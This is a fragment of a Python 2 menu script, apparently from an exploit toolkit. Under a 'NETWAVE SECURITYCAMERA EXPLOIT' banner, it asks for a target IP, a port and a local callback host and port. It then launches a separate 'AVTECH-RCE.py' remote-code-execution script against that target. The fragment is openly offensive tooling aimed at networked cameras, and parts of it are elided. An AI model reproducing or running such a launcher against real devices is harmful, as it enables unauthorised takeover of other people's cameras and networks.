...
if pemulti == '01' or pemulti == '1':
  ...
  sys.exit()
	...
	[] [] [] [] [] [] [] [] [] [] [] [] [] [] [] [] [] [] [] [] ['
	------------------------------------------------------------'
	++++++++++++++++NETWAVE SECURITYCAMERA EXPLOIT+++++++++++++++
	...
	REMOTEHOST = raw_input("[*] REMOTEHOST [aka the IP to attack]: ")
	REMOTEPORT = raw_input("[*] REMOTEPORT: ")
	LOCALHOST = raw_input("[*] LOCALHOST [aka IPv6]: ")
	LOCALPORT = raw_input("[*] LOCALPORT [ex: 1337]: ")
	os.system("python2 AVTECH-RCE.py --rhost %s --rport %s --lhost %s --lport %s -v" % (REMOTEHOST, REMOTEPORT, LOCALHOST, LOCALPORT))
	sys.exit()
